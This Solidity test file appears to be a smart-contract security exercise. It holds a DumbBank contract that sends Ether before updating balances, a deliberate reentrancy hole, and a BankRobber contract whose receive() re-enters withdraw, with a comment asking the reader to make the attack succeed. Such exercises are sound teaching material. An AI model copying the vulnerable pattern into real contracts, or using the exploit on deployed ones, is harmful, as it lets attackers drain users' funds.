// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {Test, console} from "lib/forge-std/src/Test.sol";

contract DumbBank is Test {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(amount <= balances[msg.sender], "not enough funds");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

interface IDumbBank {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

// This attack fails. Make the attack succeed.
contract BankRobber is Test {
    IDumbBank public dumbBank;

    constructor(address _dumbBank) payable {
        dumbBank = IDumbBank(_dumbBank);
        // dumbBank.deposit{value: 1 ether}();
        // dumbBank.withdraw(1 ether);
    }

    function pwn() payable external {
        dumbBank.deposit{value: 1 ether}();
        dumbBank.withdraw(1 ether);
    }

    receive() external payable {
        if (address(dumbBank).balance >= 1 ether) {
            dumbBank.withdraw(1 ether);
        }
    }
}